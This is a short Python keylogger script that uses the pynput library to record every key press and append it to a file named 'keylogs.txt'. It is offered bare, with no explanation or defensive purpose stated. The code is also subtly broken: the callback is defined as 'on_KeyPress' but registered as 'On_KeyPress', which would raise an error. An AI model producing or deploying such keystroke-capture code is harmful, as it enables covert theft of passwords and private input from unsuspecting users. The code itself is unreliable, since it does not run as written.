from pynput.keyboard import Key, Listener

def on_KeyPress(key):
    with open("keylogs.txt", "a") as file:
        file.write(str(key))

with Listener(on_press=On_KeyPress) as listener:
    listener.join()